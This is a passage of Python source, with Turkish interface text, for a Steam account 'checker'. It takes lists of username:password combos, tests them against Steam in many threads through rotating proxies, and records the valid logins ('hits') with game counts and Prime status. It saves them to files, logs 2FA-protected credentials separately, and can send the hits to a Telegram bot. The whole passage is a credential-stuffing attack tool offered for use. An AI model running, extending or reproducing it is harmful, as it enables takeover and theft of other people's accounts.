            "game_count": game_count,
            "prime": prime_clean,
            "multiline": multiline_str
        }

    except Exception:
        return "BAD", None

def worker(q, proxies):
    while not q.empty():
        combo = q.get()
        if ":" not in combo:
            q.task_done()
            continue
            
        u, p = combo.split(":", 1)
        proxy = random.choice(proxies) if proxies else None
        
        status, details = check_account(u, p, proxy)
        
        with lock:
            stats["CHECKED"] += 1
            now = datetime.now().strftime("%H:%M:%S")
            
            if status == "HIT":
                stats["HIT"] += 1
                
                sys.stdout.write(f"\033]0;Syiq STEAM CHECKER V3 | HIT: {stats['HIT']} | BAD: {stats['BAD']} | 2FA: {stats['2FA']} | KALAN: {stats['TOTAL'] - stats['CHECKED']}\007")
                
                sys.stdout.write(f"\033[K\n{G}╔════════════════════════════════════════════════════════════╗\n")
                sys.stdout.write(f"║ [{now} - HIT YAKALANDI!] -> {u}\n")
                sys.stdout.write(f"╚════════════════════════════════════════════════════════════╝{W}\n")
                sys.stdout.write(details["multiline"] + "\n\n")
                
                if config["save_file"]:
                    os.makedirs("Syiq Steam Hits", exist_ok=True)
                    safe_user = re.sub(r'[^a-zA-Z0-9_]', '', details["username"])
                    filename = f"Syiq Steam Hits/Oyun_{details['game_count']}_Prime_{details['prime']}_{safe_user}.txt"
                    
                    with open(filename, "w", encoding="utf-8") as f:
                        f.write(details["multiline"] + "\n")
                    
                    with open("Syiq Steam Hits/all_hits.txt", "a", encoding="utf-8") as f_all:
                        f_all.write(details["multiline"] + "\n")
                        
                send_tg(f"✅ YENİ HESAP ONAYLANDI!\nOyun Sayısı: {details['game_count']}\nSeçkin: {details['prime']}\nKullanıcı: {details['username']}\n| Syiq Checker")
                
            elif status == "2FA":
                stats["2FA"] += 1
                sys.stdout.write(f"\033[K{Y}[{now} - 2FA] {W}{u}:{p}\n")
                if config["save_file"]:
                    with open("2fa.txt", "a", encoding="utf-8") as f: f.write(f"{u}:{p}\n")
            else:
                stats["BAD"] += 1
            
            sys.stdout.write(f"\033]0;STEAM CHECKER V3 | HIT: {stats['HIT']} | BAD: {stats['BAD']} | 2FA: {stats['2FA']} | KALAN: {stats['TOTAL'] - stats['CHECKED']}\007")
            sys.stdout.write(f"\033[K{C}Tarama: [{stats['CHECKED']}/{stats['TOTAL']}] {G}HIT:{stats['HIT']} {R}BAD:{stats['BAD']} {Y}2FA:{stats['2FA']} {W}| {C}Checking: {u}\r")
            sys.stdout.flush()
            
        q.task_done()

def settings_menu():
    while True:
        clear()
        print(f"\n{C}{B}   --- AYARLAR MENÜSÜ ---{W}")
        print(f"   [1] Hits.txt Kaydı (Ayrı Dosyalar & all_hits.txt): {'{G}AÇIK{W}' if config['save_file'] else '{R}KAPALI{W}'}".format(G=G, R=R, W=W))
        print(f"   [2] Telegram Gönderimi: {'{G}AÇIK{W}' if config['send_telegram'] else '{R}KAPALI{W}'}".format(G=G, R=R, W=W))
        print(f"   [3] Ana Menüye Dön (Kaydet)")
     
        choice = input(f"\n{Y}   Seçim > {W}")
        if choice == "1":
            config["save_file"] = not config["save_file"]
        elif choice == "2":
            config["send_telegram"] = not config["send_telegram"]
            if config["send_telegram"]:
                config["bot_token"] = input(f"{C}   Bot Token > {W}")
                config["chat_id"] = input(f"{C}   Chat ID > {W}")
        elif choice == "3":
            break

def main():
    while True:
        clear()
        print_banner()
        print(f"   [1] Başlat")
        print(f"   [2] Ayarlar (Zorunlu)")
        print(f"   [3] Çıkış")
     
        choice = input(f"\n{G}   Menü Seçimi > {W}")

        if choice == "1":
            if not config["save_file"] and not config["send_telegram"]:
                print(f"{R}   [!] Önce Ayarlar'dan kayıt yöntemini seçmelisin!{W}")
                time.sleep(2)
                continue
         
            path = input(f"{C}   Combo Path > {W}").strip()
            if not os.path.exists(path):
                print(f"{R}   [!] Combo dosyası bulunamadı!{W}")
                time.sleep(2)
                continue

            proxy_path = input(f"{C}   Proxy Path (Boş geçmek için ENTER) > {W}").strip()
            proxies = []
            if proxy_path and os.path.exists(proxy_path):
                with open(proxy_path, "r", encoding="utf-8", errors="ignore") as f:
                    proxies = [format_proxy(l) for l in f if l.strip()]
                print(f"{G}   [+] {len(proxies)} Proxy yüklendi!{W}")
            elif proxy_path:
                print(f"{Y}   [!] Proxy dosyası bulunamadı, proxysiz devam edilecek.{W}")
                time.sleep(2)
         
            thr_input = input(f"{C}   Thread Sayısı (Varsayılan 10) > {W}").strip()
            thr = int(thr_input) if thr_input.isdigit() and int(thr_input) > 0 else 10
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                combos = [l.strip() for l in f if ":" in l]
         
            stats["TOTAL"] = len(combos)
            q = Queue()
            for c in combos: q.put(c)
         
            clear()
            print_banner()
            print(f"\n{G}   [+] Tarama Başladı... Lütfen bekleyin.{W}\n")
            
            for _ in range(thr):
                threading.Thread(target=worker, args=(q, proxies), daemon=True).start()
            q.join()
            input(f"\n\n{G}   Taramalar Bitti. Menüye dönmek için ENTER'a basın.{W}")

        elif choice == "2":
            settings_menu()
        elif choice == "3":
            sys.exit()

if __name__ == "__main__":
    main()
